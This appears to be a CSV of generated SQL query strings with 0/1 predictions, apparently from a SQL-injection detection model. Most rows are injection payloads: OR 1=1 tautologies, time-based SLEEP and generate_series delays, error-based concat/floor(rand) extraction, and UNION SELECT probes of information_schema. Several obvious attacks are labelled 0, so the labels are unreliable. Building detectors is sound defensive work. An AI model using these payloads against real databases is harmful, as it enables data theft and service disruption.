Generated Queries,Prediction
SELECT * FROM exercise WHERE raise = 'fact'  OR start = 'slip' OR 'a'='a',0
l+echosa OR 1=1,0
gourtchenko@cirujanaplastica.nl AND SLEEP(5),0
02056001p AND SLEEP(5),1
"1'||  (  select 'gboi' where 4191  =  4191 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   ||' UNION SELECT column_name FROM (SELECT * FROM information_schema.tables) AS sub",1
"-4528""  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  ""fxmt"" like ""fxmt UNION SELECT column_name FROM (SELECT * FROM information_schema.tables) AS sub",1
SELECT * FROM slight WHERE indeed IN  ( SELECT hard FROM describe ) ,0
 (  select   (  case when   (  6035  =  9882  )   then 6035 else 6035*  (  select 6035 from mysql.db  )   end   )    )  UNION SELECT column_name FROM (SELECT * FROM information_schema.tables) AS sub,1
SELECT TOP 3 * FROM moving UNION SELECT column_name FROM (SELECT * FROM information_schema.tables) AS sub,0
"1""  )   as cxwd where 5800  =  5800 or 6979  =  like  (  ""abcdefg"",upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
"1  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  2160  =  2160",1
"1'||  (  select 'fraa' from dual where 9140  =  9140 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x   )    )   ||' UNION SELECT * FROM information_schema.tables",1
"   SELECT balance, order, roadFROM hospital WHERE muscle  IS NOT NULL",0
"1 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   UNION SELECT *",1
SELECT AVG ( relationship ) FROM fox UNION SELECT column_name FROM (SELECT * FROM information_schema.tables) AS sub,0
"cabrillas AND IF(1=1, SLEEP(5), 0) --",1
SELECT * FROM office  WHERE equator NOT LIKE '[still]%' OR 1=1 --,0
"-7661"" union all select 9551,9551,9551# OR 313d31",1
"SELECT * FROM plural  WHERE related NOT LIKE '[according]%' AND 1=CONVERT(int, (SELECT @@version))",0
"SELECT more ( s )  FROM do FULL OUTER JOIN AND IF(1=1, SLEEP(5), 0) --",0
"2.04E+15 AND 1=CONVERT(int, (SELECT @@version))",1
-4775'  )   or 3038  =  3038 UNION SELECT * FROM information_schema.tables,1
SELECT * FROM copy  WHERE year NOT LIKE '[forget]%' UNION SELECT *,0
0om7rera AND SLEEP(5),1
"1""   )    )    as nbdc where 4444  =  4444 union all select null,null--",1
"1""   )    )    as maxe where 5883  =  5883 union all select null,null,null,null,null,null,null,null,null# OR 'a'='a'",1
SELECT AVG ( whom ) FROM having SELECT SUM ( sweet )  UNION SELECT *,0
"1' where 7176  =  7176 AND IF(1=1, SLEEP(5), 0) --",1
ludolfo OR 1=1 --,0
33829 UNION SELECT column_name FROM (SELECT * FROM information_schema.tables) AS sub,1
wardle OR 313d31,0
"1'  )   and elt  (  3114  =  3114,sleep  (  5   )    )   # UNION SELECT *",1
"1  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   UNION SELECT * FROM information_schema.tables",1
jeanhee,0
1.35045E+15 UNION SELECT *,0
SELECT pot FROM promised,0
"   SELECT passage, mine+ ', ' + tiny+ ' ' + mail+ ', ' + character AS capital  FROM importance OR 313d31",0
5309 UNION SELECT column_name FROM (SELECT * FROM information_schema.tables) AS sub,1
8328 UNION SELECT * FROM information_schema.tables,1
SELECT enter ( s )  FROM funny LEFT JOIN UNION SELECT *,0
carlina OR 1=1 --,0
"1""   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   ""mmvu""  =  ""mmvu OR 1=1",1
"lula AND 1=CONVERT(int, (SELECT @@version))",1
serville9 UNION SELECT *,0
"1'   )    )     )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  'zeum'  =  'zeum OR 313d31",1
"   SELECT aboard, cookies, feathers FROM instant WHERE wrote  IS NULL UNION SELECT *",0
"calle pea 49, 9?b OR 313d31",0
